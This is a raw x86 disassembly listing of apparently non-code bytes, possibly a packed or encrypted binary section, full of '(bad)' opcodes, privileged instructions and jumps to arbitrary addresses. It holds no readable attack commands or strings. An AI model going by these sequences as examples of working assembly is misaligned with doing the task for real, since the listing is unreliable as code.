  423113:	cmp    eax,0xf5fe5b6f
  423118:	dec    BYTE PTR [edi]
  42311a:	xchg   dh,ah
  42311c:	inc    esp
  42311d:	mov    bh,0x70
  42311f:	in     al,dx
  423120:	iret   
  423121:	xchg   dl,ah
  423123:	or     al,0xcc
  423125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423126:	push   0x31
  423128:	(bad)  
  423129:	lods   eax,DWORD PTR ds:[esi]
  42312a:	cmp    eax,DWORD PTR [ebp+ebx*8-0x69]
  42312e:	mov    dl,0xa1
  423130:	aad    0xe9
  423132:	dec    esi
  423133:	jb     0x423162
  423135:	or     eax,0xf2d00b81
  42313a:	lods   eax,DWORD PTR ds:[esi]
  42313b:	out    0x15,eax
  42313d:	push   edx
  42313e:	or     DWORD PTR [ecx+0x4d41e54a],esi
  423144:	shl    DWORD PTR [ebp+0x7c],cl
  423147:	pop    esi
  423148:	mov    dh,0x74
  42314a:	push   ebx
  42314b:	xlat   BYTE PTR fs:[ebx]
  42314d:	pop    eax
  42314e:	mov    eax,0xe0abc8c8
  423153:	sub    bl,BYTE PTR [esp+ebx*8-0x70]
  423157:	ret    
  423158:	daa    
  423159:	and    al,0xb6
  42315b:	inc    eax
  42315c:	inc    ebx
  42315d:	jmp    0x4230e4
  42315f:	dec    ecx
  423160:	jno    0x423184
  423162:	mov    edi,0x19c48c2f
  423167:	sbb    al,0x1c
  423169:	scas   eax,DWORD PTR es:[edi]
  42316a:	fcomp  DWORD PTR [ecx-0x79165653]
  423170:	arpl   WORD PTR [ecx+0x280b7fac],ax
  423176:	jns    0x4231b5
  423178:	push   esp
  423179:	sbb    dh,cl
  42317b:	lds    esp,FWORD PTR [esi+ebp*4+0x21]
  42317f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423180:	push   es
  423181:	sub    DWORD PTR [edx+0x16197652],edi
  423187:	mov    ah,BYTE PTR [edx-0x5f]
  42318a:	lea    eax,ss:[ebx+edi*8+0xe06c96]
	...
  4231f2:	add    BYTE PTR [eax],al
  4231f4:	jns    0x4231e7
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x1634004b],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0x8e000001,al
  42320d:	call   0xc843:0xaefdbf3a
  423214:	out    0x1c,eax
  423216:	cmp    DWORD PTR [ebp+0x19],eax
  423219:	lods   al,BYTE PTR ds:[esi]
  42321a:	mov    ch,BYTE PTR [ecx-0x72d04ad3]
  423220:	xor    dh,bl
  423222:	pop    ecx
  423223:	jo     0x4231bb
  423225:	xor    BYTE PTR [ecx+0x2d],0x2e
  423229:	add    bh,BYTE PTR [edx]
  42322b:	jl     0x4231b5
  42322d:	inc    esi
  42322e:	xchg   ch,al
  423230:	pop    ebp
  423231:	test   BYTE PTR [ecx-0x7b],ch
  423234:	fstp   DWORD PTR [edx]
  423236:	arpl   WORD PTR [esi+0x1934f4c7],si
  42323c:	cmp    al,0x6c
  42323e:	sbb    eax,0x9a8d24a6
  423243:	push   ebp
  423244:	jmp    0xd7d347ef
  423249:	out    dx,al
  42324a:	std    
  42324b:	xor    edi,DWORD PTR [esi-0xf848469]
  423251:	aas    
  423252:	int3   
  423253:	lock jmp 0xf6d8de73
  423259:	inc    esi
  42325a:	dec    esp
  42325b:	mov    eax,ds:0xb48ede59
  423260:	cmc    
  423261:	add    al,0xbe
  423263:	dec    esi
  423264:	mov    ds:0x4635c5e4,al
  423269:	push   ecx
  42326a:	mov    ebx,edi
  42326c:	loopne 0x4232e1
  42326e:	pop    esp
  42326f:	adc    ebx,DWORD PTR [eax-0x7688aaa7]
  423275:	xchg   esp,eax
  423276:	add    eax,0xfc2c2601
  42327b:	mov    ebp,esi
  42327d:	loop   0x423269
  42327f:	int3   
  423280:	inc    esi
  423281:	rcl    BYTE PTR [ebx],1
  423283:	div    esp
  423285:	retf   0x3919
  423288:	xor    ch,bh
  42328a:	popf   
  42328b:	mov    al,0x93
  42328d:	and    BYTE PTR [edx-0x17],cl
  423290:	sbb    ah,BYTE PTR [esi+edx*8-0x5e637c5f]
  423297:	sar    bh,cl
  423299:	test   al,0x23
  42329b:	mov    bh,0x5a
  42329d:	pop    ebx
  42329e:	aaa    
  42329f:	out    0x60,al
  4232a1:	sbb    al,0x10
  4232a3:	dec    esi
  4232a4:	enter  0xfd54,0x8e
  4232a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232a9:	cmp    ch,BYTE PTR [ebp+eiz*2+0x7aff6e2f]
  4232b0:	lahf   
  4232b1:	scas   al,BYTE PTR es:[edi]
  4232b2:	std    
  4232b3:	adc    al,0x1f
  4232b5:	jmp    0x94a90169
  4232ba:	out    0xad,al
  4232bc:	call   0xdaaf:0x234eaa3b
  4232c3:	add    bh,BYTE PTR [edi]
  4232c5:	pop    esi
  4232c6:	dec    edx
  4232c7:	pop    ecx
  4232c8:	xchg   DWORD PTR [eax-0x5a],eax
  4232cb:	xchg   edi,eax
  4232cc:	pushf  
  4232cd:	cmp    DWORD PTR [ebx],edi
  4232cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232d0:	out    dx,eax
  4232d1:	pop    ds
  4232d2:	scas   al,BYTE PTR es:[edi]
  4232d3:	outs   dx,DWORD PTR ds:[esi]
  4232d4:	sub    eax,0x3ac3e433
  4232d9:	ret    0x695f
  4232dc:	mov    bl,bh
  4232de:	loopne 0x4232ef
  4232e0:	mov    BYTE PTR [edx+0x327ada0c],bh
  4232e6:	pop    ecx
  4232e7:	add    cl,dh
  4232e9:	add    esi,ebx
  4232eb:	mov    ebp,0x9b3cb728
  4232f0:	popa   
  4232f1:	inc    ebp
  4232f2:	push   eax
  4232f3:	jmp    0x26ba0bc3
  4232f8:	xchg   ebp,eax
  4232f9:	jbe    0x42330b
  4232fb:	loop   0x423374
  4232fd:	xchg   ecx,eax
  4232fe:	xor    BYTE PTR [ebx-0x2a],dh
  423301:	out    0x68,al
  423303:	mov    ds:0xc3fefcf3,eax
  423308:	mov    ds:0x46f27550,al
  42330d:	push   ss
  42330e:	push   ss
  42330f:	sbb    esp,DWORD PTR [edi+0x0]
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xea1f0f44
  423382:	cmp    eax,DWORD PTR [ebp+0x1780b]
  423388:	add    eax,0x47000001
  42338d:	div    DWORD PTR ds:0x3f8e1fd2
  423393:	inc    ebx
  423394:	fstp   QWORD PTR [ecx]
  423396:	xor    edi,DWORD PTR ds:0x231fb825
  42339c:	cmc    
  42339d:	test   DWORD PTR [edx],ecx
  42339f:	cmp    al,dh
  4233a1:	in     al,dx
  4233a2:	mov    al,0x34
  4233a4:	xor    DWORD PTR [esi-0x75cf9ee8],0x64
  4233ab:	jmp    0x2964:0x2f729b91
  4233b2:	hlt    
  4233b3:	xlat   BYTE PTR ds:[ebx]
  4233b4:	sub    BYTE PTR [edx+0x2cd2a61a],bh
  4233ba:	loopne 0x423374
  4233bc:	dec    ebx
  4233bd:	add    dl,cl
  4233bf:	cmc    
  4233c0:	iret   
  4233c1:	jb     0x4233d4
  4233c3:	ret    
  4233c4:	shl    eax,0x58
  4233c7:	pop    edx
  4233c8:	popf   
  4233c9:	clc    
  4233ca:	std    
  4233cb:	xchg   DWORD PTR [edi],edi
  4233cd:	outs   dx,BYTE PTR ds:[esi]
  4233ce:	pusha  
  4233cf:	jg     0x423374
  4233d1:	je     0x423428
  4233d3:	add    ch,bh
  4233d5:	mov    ds:0x1a19e573,al
  4233da:	or     edi,DWORD PTR [ebx]
  4233dc:	(bad)  
  4233de:	sbb    BYTE PTR [ecx+edi*8-0x74023b4c],cl
  4233e5:	mov    ebx,0x2109290e
  4233ea:	and    DWORD PTR [edi+0xbfe7a93],eax
  4233f0:	xor    BYTE PTR [edi-0x269b59a4],al
  4233f6:	or     BYTE PTR [ebx+0x546f87a6],bl
  4233fc:	sub    DWORD PTR [ebx],edi
  4233fe:	into   
  4233ff:	ins    BYTE PTR es:[edi],dx
  423400:	gs mov ebp,0x159f1ec1
  423406:	pop    es
  423407:	test   dh,bh
  423409:	inc    ebx
  42340a:	test   BYTE PTR [esi-0x153996cb],dl
  423410:	mov    edi,0xc108166b
  423415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423416:	sahf   
  423417:	paddd  mm4,mm4
  42341a:	cmp    al,0x96
  42341c:	and    BYTE PTR [esp],0xfa
  423420:	repz cmp bl,BYTE PTR ds:0x3b74e1b
  423427:	gs retf 
  423429:	test   BYTE PTR [esi-0x20],bl
  42342c:	call   0x3b4:0x6344405
  423433:	ja     0x42346f
  423435:	add    eax,0x37d9b402
  42343a:	rcr    DWORD PTR [ecx+0x55c96c0e],0x1b
  423441:	data16 icebp 
  423443:	cmp    cl,BYTE PTR [ebx-0x457dbb34]
  423449:	repz jl 0x423407
  42344c:	ja     0x4234ca
  42344e:	mov    DWORD PTR [ebp+0x6c],eax
  423451:	ss jecxz 0x42346b
  423454:	xor    dh,BYTE PTR [ebx-0xe]
  423457:	cld    
  423458:	scas   eax,DWORD PTR es:[edi]
  423459:	inc    edx
  42345a:	mov    edx,0x5dcfc322
  42345f:	lahf   
  423460:	add    DWORD PTR [edi],edi
  423462:	push   eax
  423463:	sbb    BYTE PTR [eax],ah
  423465:	stc    
  423466:	mov    esp,0xecf58a1f
  42346b:	sbb    esi,DWORD PTR [eax-0x633b9c8e]
  423471:	out    dx,al
  423472:	repnz mov esp,0x4d630a17
  423478:	jmp    0x9113:0xddd61d94
  42347f:	stc    
  423480:	call   0x61df:0x595fa58f
  423487:	dec    eax
  423488:	pop    ds
  423489:	add    BYTE PTR [eax+0x3e],0x95
  42348d:	push   edx
  42348e:	sahf   
  42348f:	lods   al,BYTE PTR ds:[esi]
  423490:	loope  0x423492
	...
  4234f2:	add    BYTE PTR [eax],al
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	mov    al,0xc3
  423502:	add    bh,BYTE PTR [eax]
  423504:	adc    BYTE PTR [ecx+0x1],bh
  423507:	add    BYTE PTR ds:0x1e000001,al
  42350d:	mov    bl,0x95
  42350f:	jb     0x423565
  423511:	jmp    0x423573
  423513:	push   es
  423514:	call   FWORD PTR [ecx-0x5d]
  423517:	pop    esi
  423518:	repz add eax,0xba9e154e
  42351e:	pop    esp
  42351f:	outs   dx,BYTE PTR ds:[esi]
  423521:	cmc    
  423522:	mov    bh,0xb3
  423524:	mov    edx,edx
  423526:	ins    BYTE PTR es:[edi],dx
  423527:	das    
  423528:	test   ecx,ebx
  42352a:	sub    al,0xb
  42352c:	mov    ds:0x97a24863,al
  423531:	sub    bh,BYTE PTR [eax-0x67]
  423534:	int    0x2e
  423536:	bswap  edi
  423538:	bound  ebx,QWORD PTR [esi+0x6]
  42353b:	imul   ebp,DWORD PTR [ebx+edx*2],0x6f49a91d
  423542:	ret    
  423543:	fcom   QWORD PTR [ebx+esi*2]
  423546:	mov    DWORD PTR [edx],esp
  423548:	test   DWORD PTR [eax-0x2d1daf97],eax
  42354e:	pop    ds
  42354f:	add    eax,0x41953486
  423554:	popa   
  423555:	outs   dx,BYTE PTR ds:[esi]
  423556:	adc    bh,BYTE PTR [eax-0x51]
  423559:	xlat   BYTE PTR ds:[ebx]
  42355a:	mov    ch,0xe8
  42355c:	adc    DWORD PTR [esi],ebp
  42355e:	ja     0x4235aa
  423560:	add    al,0x74
  423562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423563:	xor    BYTE PTR [edx+ecx*4+0x50],cl
  423567:	aas    
  423568:	mov    cl,ch
  42356a:	add    edi,DWORD PTR [ecx+0x4]
  42356d:	xor    DWORD PTR [esi],esp
  42356f:	xchg   edi,eax
  423570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423571:	cmp    ecx,DWORD PTR [edx+0x11]
  423574:	mov    fs,WORD PTR [edi+ecx*8+0x42194b3c]
  42357b:	pop    edi
  42357c:	mov    esi,0xe5532b34
  423581:	push   eax
  423582:	(bad)  
  423583:	adc    bl,dh
  423585:	push   ecx
  423586:	mov    al,ds:0x9e351837
  42358b:	icebp  
  42358c:	lahf   
  42358d:	mov    edi,0x2d64ffe5
  423592:	inc    edx
  423593:	imul   eax,DWORD PTR [edx],0xffffffa8
  423596:	popf   
  423597:	xor    eax,0x2023a53a
  42359c:	into   
  42359d:	cdq    
  42359e:	fs scas al,BYTE PTR es:[edi]
  4235a0:	mov    dl,0x67
  4235a2:	push   ss
  4235a3:	out    0xc,eax
  4235a5:	js     0x4235f2
  4235a7:	or     DWORD PTR [esi+0x14ac4624],ebx
  4235ad:	dec    ecx
  4235ae:	sub    eax,0xe718178f
  4235b3:	std    
  4235b4:	or     BYTE PTR [ebp+0x212db360],al
  4235ba:	pop    eax
  4235bb:	out    dx,eax
  4235bc:	idiv   esi
  4235be:	dec    edx
  4235bf:	add    eax,0x963d1926
  4235c4:	dec    ebx
  4235c5:	pop    es
  4235c6:	cld    
  4235c7:	cmp    DWORD PTR [eax],ecx
  4235c9:	fistp  DWORD PTR [eax-0x7d8ffc7d]
  4235cf:	mov    edx,0xe89a7e03
  4235d4:	icebp  
  4235d5:	pop    esp
  4235d6:	add    eax,DWORD PTR [eax-0x12]
  4235d9:	jne    0x423579
  4235db:	mov    edx,DWORD PTR [ebx+0x26706555]
  4235e1:	push   cs
  4235e2:	or     al,0x95
  4235e4:	dec    ebx
  4235e5:	mov    bl,0x53
  4235e7:	and    eax,0x92991fc9
  4235ec:	sahf   
  4235ed:	cmp    ebp,edx
  4235ef:	inc    edx
  4235f0:	sub    al,0xf5
  4235f2:	cmp    edi,DWORD PTR [esi+0x41ba31d]
  4235f8:	sub    BYTE PTR [edx-0x2cec474c],0x18
  4235ff:	iret   
  423600:	cli    
  423601:	leave  
  423602:	and    al,0xf6
  423604:	imul   eax,DWORD PTR [eax+0x247be53e],0x131235c5
  42360e:	mov    ah,0x2b
  423610:	mov    ah,0x0
	...
  423672:	add    BYTE PTR [eax],al
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	cs sbb al,0x17
  423683:	mov    al,ds:0x17a15
  423688:	add    eax,0xf2000001
  42368d:	outs   dx,BYTE PTR ds:[esi]
  42368e:	repz int3 
  423690:	or     ebp,DWORD PTR [eax+0x6cf8179c]
  423696:	jmp    0xf6e8:0xca45f05
  42369d:	aas    
  42369e:	aaa    
  42369f:	pop    edx
  4236a0:	and    bh,BYTE PTR [esi]
  4236a2:	imul   esp,DWORD PTR [eax+0x54],0xfffffff4
  4236a6:	inc    ebp
  4236a7:	push   edx
  4236a8:	and    al,0xed
  4236aa:	aad    0x1c
  4236ac:	sbb    ah,BYTE PTR [esi+0x29bf21c3]
  4236b2:	jle    0x42369c
  4236b4:	mov    dh,ah
  4236b6:	cmc    
  4236b7:	mov    ds,WORD PTR [ebx-0x6ae35c84]
  4236bd:	outs   dx,BYTE PTR ds:[esi]
  4236bf:	cdq    
  4236c0:	mov    ch,0x5f
  4236c2:	rcl    esp,0x58
  4236c5:	aas    
  4236c6:	inc    ecx
  4236c7:	sub    al,ch
  4236c9:	sub    DWORD PTR [esi-0x2240b313],ebp
  4236cf:	dec    esi
  4236d0:	mov    al,0x72
  4236d2:	adc    DWORD PTR [eax+0x65],eax
  4236d5:	add    BYTE PTR [ecx-0x16d51a06],dh
  4236db:	cmp    cl,0x8c
  4236de:	mov    bl,BYTE PTR [ebx+edi*2]
  4236e1:	adc    al,0x40
  4236e3:	sbb    dl,BYTE PTR [ecx-0x3e6f7e8b]
  4236e9:	repz push ebp
  4236eb:	push   ebx
  4236ec:	pop    esi
  4236ed:	push   ebp
  4236ee:	sbb    DWORD PTR [edx+0x5dfbd2c4],ebp
  4236f4:	mov    ds:0xd8214341,al
  4236f9:	dec    BYTE PTR [edi+eiz*4-0x4d429e74]
  423700:	push   ds
  423701:	jne    0x4236ff
  423703:	pop    es
  423704:	sahf   
  423705:	aaa    
  423706:	jns    0x4236b6
  423708:	add    DWORD PTR [eax-0x39],eax
  42370b:	(bad)  
  42370c:	hlt    
  42370d:	icebp  
  42370e:	jg     0x42370c
  423710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423711:	jp     0x42378e
  423713:	cdq    
  423714:	int    0x57
  423716:	(bad)  
  423717:	push   edi
  423718:	lds    eax,FWORD PTR [edx]
  42371a:	xchg   DWORD PTR [edi+0x67],esi
  42371d:	aas    
  42371e:	sub    al,0xb
  423720:	clc    
  423721:	sub    DWORD PTR [esi+ebp*1],esi
  423724:	sbb    esi,DWORD PTR [esi]
  423726:	adc    eax,edi
  423728:	adc    eax,0x89645bc6
  42372d:	xchg   esp,eax
  42372e:	sub    dh,bh
  423730:	test   DWORD PTR [esi+0x0],0xf98aa40f
  423737:	shl    eax,cl
  423739:	sbb    DWORD PTR [ecx-0x5c],0xfffffff2
  42373d:	dec    ecx
  42373e:	int    0x99
  423740:	dec    edx
  423741:	je     0x423775
  423743:	outs   dx,BYTE PTR ds:[esi]
  423744:	adc    esi,ebx
  423746:	call   DWORD PTR [edi-0x67]
  423749:	jl     0x42378c
  42374b:	xchg   esi,eax
  42374c:	(bad)
  42374f:	mov    edi,0x63f43924
  423754:	call   DWORD PTR [eax-0x5a]
  423757:	neg    BYTE PTR [ebx-0x55]
  42375a:	pop    es
  42375b:	(bad)  
  42375c:	jp     0x423757
  42375e:	cmp    eax,0x3ce41a82
  423763:	jge    0x423773
  423765:	pop    ss
  423766:	inc    ebx
  423767:	(bad)  
  423768:	and    BYTE PTR [edx],dh
  42376a:	les    edi,FWORD PTR [esp+edx*4+0x33fd337e]
  423771:	pushf  
  423772:	leave  
  423773:	sub    ebx,DWORD PTR [edx+0x4d2df65a]
  423779:	fs cmp edi,esp
  42377c:	and    al,0xc9
  42377e:	ds ss mov bl,0xb5
  423782:	mov    al,bl
  423784:	test   DWORD PTR [esi-0x24],0x870834e6
  42378b:	jb     0x4237f1
  42378d:	xchg   esp,eax
  42378e:	rcr    DWORD PTR [ecx+0x1e],0x0
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0xe179d5da
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0xf000001
  42380d:	mov    ss,WORD PTR [ebx+0x18]
  423810:	or     BYTE PTR [ebp+0x45],cl
  423813:	sbb    edi,DWORD PTR [eax]
  423815:	repz push ss
  423817:	aad    0x61
  423819:	into   
  42381a:	dec    ecx
  42381b:	mov    ch,0x91
  42381d:	lahf   
  42381e:	mov    ebx,0x11e85473
  423823:	adc    al,0x9f
  423825:	mov    ch,0x78
  423827:	mov    esp,0xa7ca9ce5
  42382c:	ret    
  42382d:	jp     0x4238a9
  42382f:	dec    edx
  423830:	mov    esp,0xc59bb63b
  423835:	std    
  423836:	push   es
  423837:	jmp    0xb26f:0xc336e09d
  42383e:	jmp    0xeac6e6c1
  423843:	mov    esp,DWORD PTR [ebx+0x542a938]
  423849:	add    esi,DWORD PTR [edi+eax*4]
  42384c:	cli    
  42384d:	sbb    al,0xce
  42384f:	ror    dh,1
  423851:	pop    ecx
  423852:	mov    ch,0x36
  423854:	inc    eax
  423855:	into   
  423856:	jge    0x42386e
  423858:	xor    DWORD PTR [ebx+0x6c71a18d],edi
  42385e:	test   DWORD PTR [esi-0x76ea7980],ecx
  423864:	push   ds
  423865:	test   BYTE PTR [ecx+0x6e3d364a],ah
  42386b:	and    ah,0xbb
  42386e:	cmc    
  42386f:	(bad)  
  423870:	call   DWORD PTR [ebp+0xf]
  423873:	fidivr WORD PTR ds:0x1f68af85
  423879:	gs add ebx,0x75
  42387d:	inc    eax
  42387e:	scas   eax,DWORD PTR es:[edi]
  42387f:	sub    ebp,ebp
  423881:	loopne 0x42380e
  423883:	aaa    
  423884:	sub    cl,al
  423886:	dec    esp
  423887:	sub    eax,0x8663154f
  42388c:	rol    ah,0xac
  42388f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423890:	mov    esp,0xa6101777
  423895:	mov    BYTE PTR [ebp-0x7e],dl
  423898:	pop    ss
  423899:	mov    ds:0x437da4d9,al
  42389e:	nop
  42389f:	xchg   edi,eax
  4238a0:	mov    edi,0x476dded4
  4238a5:	ss repz inc ecx
  4238a8:	lahf   
  4238a9:	mov    ch,0x50
  4238ab:	enter  0xb95,0x81
  4238af:	ins    DWORD PTR es:[edi],dx
  4238b0:	inc    esp
  4238b1:	xchg   ebp,eax
  4238b2:	out    0x40,eax
  4238b4:	lahf   
  4238b5:	cmp    esi,ebp
  4238b7:	data16 out 0x51,al
  4238ba:	retf   0x72e7
  4238bd:	lock imul ebp,DWORD PTR [edx],0xffffffef
  4238c1:	sbb    al,0xc5
  4238c3:	sub    al,0xba
  4238c5:	mov    DWORD PTR [ebx-0x7e],edi
  4238c8:	push   esi
  4238c9:	hlt    
  4238ca:	fdivr  st(6),st
  4238cc:	push   ds
  4238cd:	push   esi
  4238ce:	xor    esp,esp
  4238d0:	dec    eax
  4238d1:	(bad)  
  4238d2:	sub    ch,BYTE PTR [ebx+edi*4-0x883ef05]
  4238d9:	dec    eax
  4238da:	pop    es
  4238db:	mov    ds,WORD PTR [edx*8-0x683908ab]
  4238e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238e3:	repnz mov esp,0x5fcf0af2
  4238e9:	jae    0x423969
  4238eb:	jl     0x42392b
  4238ed:	mov    al,ds:0x2e0eda76
  4238f2:	mov    ebp,0xf1d64aa9
  4238f7:	fistp  QWORD PTR [ebx-0x36276757]
  4238fd:	leave  
  4238fe:	push   cs
  4238ff:	jb     0x4238d0
  423901:	(bad)  
  423902:	(bad)  
  423903:	sahf   
  423904:	aas    
  423905:	es rcr ecx,0x51
  423909:	in     al,0x71
  42390b:	out    dx,eax
  42390c:	ins    DWORD PTR es:[edi],dx
  42390d:	xor    ebx,DWORD PTR [ebp+0xe407]
	...
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x2dfd2bbd
  423982:	adc    al,0x44
  423984:	pop    ds
  423985:	jl     0x423988
  423987:	add    BYTE PTR ds:0xff000001,al
  42398d:	ret    0xc253
  423990:	pop    ds
  423991:	ficomp WORD PTR [edi]
  423993:	and    DWORD PTR [edi],ebp
  423995:	push   0x62cff078
  42399a:	add    cl,BYTE PTR [edx+0xa46cbb0]
  4239a0:	fld    st(3)
  4239a2:	mov    ds:0x66d3a2c2,eax
  4239a7:	pop    edx
  4239a8:	add    dl,BYTE PTR [esi+0x62]
  4239ab:	inc    ecx
  4239ac:	sbb    DWORD PTR [ebx-0x32],esi
  4239af:	psllq  mm5,QWORD PTR [eax-0x5a4fdfc4]
  4239b6:	(bad)  
  4239b7:	jmp    0xccd3f25e
  4239bc:	loopne 0x423a22
  4239be:	or     BYTE PTR [eax-0x42],al
  4239c1:	jmp    0x423a3b
  4239c3:	shl    BYTE PTR [edx+0x61],cl
  4239c6:	(bad)  
  4239c7:	and    eax,0xdbd9e83c
  4239cc:	fucomi st,st(7)
  4239ce:	fisubr WORD PTR [esi+edx*8+0x1ef85d82]
  4239d5:	sbb    al,0x78
  4239d7:	jno    0x4239ad
  4239d9:	jae    0x423969
  4239db:	dec    ebx
  4239dc:	div    BYTE PTR [ecx]
  4239de:	ja     0x423a2a
  4239e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239e1:	cld    
  4239e2:	push   es
  4239e3:	sub    dl,BYTE PTR [ebp+ebp*2+0x4a]
  4239e7:	daa    
  4239e8:	add    al,0xa5
  4239ea:	js     0x423a34
  4239ec:	inc    ebp
  4239ed:	push   ebp
  4239ee:	dec    ecx
  4239ef:	dec    esp
  4239f0:	push   0x70
  4239f2:	icebp  
  4239f3:	arpl   WORD PTR [ecx],ax
  4239f5:	jg     0x423a44
  4239f7:	push   esi
  4239f8:	dec    ebp
  4239f9:	pop    ds
  4239fa:	push   0xb162a536
  4239ff:	in     eax,0x33
  423a01:	mov    al,0x53
  423a03:	addr16 push ebx
  423a05:	call   0x65ad:0xda0b32f6
  423a0c:	xchg   esp,eax
  423a0d:	push   ebx
  423a0e:	jmp    0xa6a0:0x7a0d18b8
  423a15:	shl    DWORD PTR [edx-0x28a71c21],0x22
  423a1c:	cli    
  423a1d:	sub    al,0x3
  423a1f:	outs   dx,DWORD PTR ds:[esi]
  423a20:	pop    eax
  423a21:	jge    0x423a0d
  423a23:	adc    eax,0x7df1edcb
  423a28:	cld    
  423a29:	inc    esi
  423a2a:	rol    DWORD PTR [edi-0x1dd5cc2d],1
  423a30:	scas   eax,DWORD PTR es:[edi]
  423a31:	dec    ecx
  423a32:	or     eax,0x5b8bfcd6
  423a37:	mov    cl,0x35
  423a39:	mov    esp,0x17beb7c3
  423a3e:	mov    ds:0x61140e65,al
  423a43:	mov    ?,WORD PTR [edx+0x3e505e7d]
  423a49:	add    ah,BYTE PTR [ebx]
  423a4b:	das    
  423a4c:	mov    ebx,0xe979ffd1
  423a51:	es push esp
  423a53:	sub    edx,DWORD PTR ds:0x2540652a
  423a59:	(bad)  
  423a5a:	in     al,0x87
  423a5c:	popa   
  423a5d:	(bad)  
  423a5e:	jle    0x423ac6
  423a60:	or     dl,BYTE PTR [eax+ecx*4]
  423a63:	ret    0xa4b7
  423a66:	push   0x28f43fc2
  423a6b:	add    eax,0xa6233879
  423a70:	sbb    eax,esp
  423a72:	xchg   DWORD PTR [ebx+ebp*2-0xc],esp
  423a76:	jmp    0x1b33aec0
  423a7b:	stc    
  423a7c:	or     al,0xdd
  423a7e:	mov    al,0x69
  423a80:	pop    esi
  423a81:	cmp    eax,0x950cd9e1
  423a86:	sbb    DWORD PTR [ecx+0x76b9746c],ecx
  423a8c:	jae    0x423acf
  423a8e:	add    ecx,esi
  423a90:	test   BYTE PTR [eax],0x0
	...
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	adc    eax,0x24e00e05
  423b05:	jge    0x423b08
  423b07:	add    BYTE PTR ds:0xb2000001,al
  423b0d:	push   0xc740cf70
  423b12:	loope  0x423b75
  423b14:	dec    ebp
  423b15:	dec    DWORD PTR [esi]
  423b17:	cmp    eax,0x215f52e0
  423b1c:	or     DWORD PTR [ebp-0xcc3e72c],esi
  423b22:	xchg   ebx,eax
  423b23:	inc    esi
  423b24:	inc    esp
  423b25:	loop   0x423b57
  423b27:	cmp    cl,BYTE PTR [edi-0x36f2c1b9]
  423b2d:	push   ecx
  423b2e:	and    bh,BYTE PTR ss:[eax-0x5d]
  423b32:	xor    esp,esi
  423b34:	leave  
  423b35:	sti    
  423b36:	and    ebp,DWORD PTR [edx]
  423b38:	iret   
  423b39:	jmpw   0x67fc
  423b3d:	sub    DWORD PTR [edi+0x432e6194],esi
  423b43:	(bad)
  423b47:	xor    bh,BYTE PTR [esi-0x13]
  423b4a:	sbb    ah,BYTE PTR [esi+0x74]
  423b4d:	ss dec eax
  423b4f:	adc    dh,ah
  423b51:	imul   ebp,DWORD PTR [eax+0x54],0xdee621a1
  423b58:	addr16 cdq 
  423b5a:	in     eax,dx
  423b5b:	and    al,0x21
  423b5d:	enter  0x3b29,0xbb
  423b61:	es pop eax
  423b63:	add    esp,esp
  423b65:	cdq    
  423b66:	sahf   
  423b67:	adc    al,0x2f
  423b69:	add    bl,BYTE PTR [ecx+0x2ef5a2d8]
  423b6f:	sbb    al,0x77
  423b71:	inc    edi
  423b72:	dec    edx
  423b73:	add    eax,0x99e075d5
  423b78:	mov    WORD PTR [edx-0x3f14e097],ss
  423b7e:	xchg   DWORD PTR [edi-0x41766cc7],edi
  423b84:	call   0x3e3fcb65
  423b89:	mov    bh,BYTE PTR [eax]
  423b8b:	adc    BYTE PTR [eax+edx*1-0x44126a8c],bh
  423b92:	and    cl,dl
  423b94:	loope  0x423be5
  423b96:	jbe    0x423ba3
  423b98:	cmp    al,0xe
  423b9a:	push   es
  423b9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b9c:	xchg   BYTE PTR [esi-0x6130a49d],ch
  423ba2:	addr16 ret 0xff30
  423ba6:	xchg   esp,eax
  423ba7:	mov    esi,0x195c8381
  423bac:	inc    esi
  423bad:	lock mov esi,0xc9310994
  423bb3:	sub    eax,0xe32c03cf
  423bb8:	cs das 
  423bba:	adc    BYTE PTR [eax],0xb7
  423bbd:	pop    edi
  423bbe:	test   BYTE PTR [ebx-0x20],bh
  423bc1:	adc    edx,0xffffffc1
  423bc4:	js     0x423bf1
  423bc6:	in     al,0x48
  423bc8:	sub    eax,0xc0bf33c8
  423bcd:	fnsave [ecx-0x3b]
  423bd0:	fdivr  QWORD PTR [ecx-0x60c8b981]
  423bd6:	push   esp
  423bd7:	mov    edi,0xc3e70b35
  423bdc:	add    eax,0xf3a3b2ed
  423be1:	mov    bl,0x50
  423be3:	fistp  DWORD PTR [eax+edx*4+0x28]
  423be7:	mov    dh,0xfd
  423be9:	fwait
  423bea:	push   ebx
  423beb:	leave  
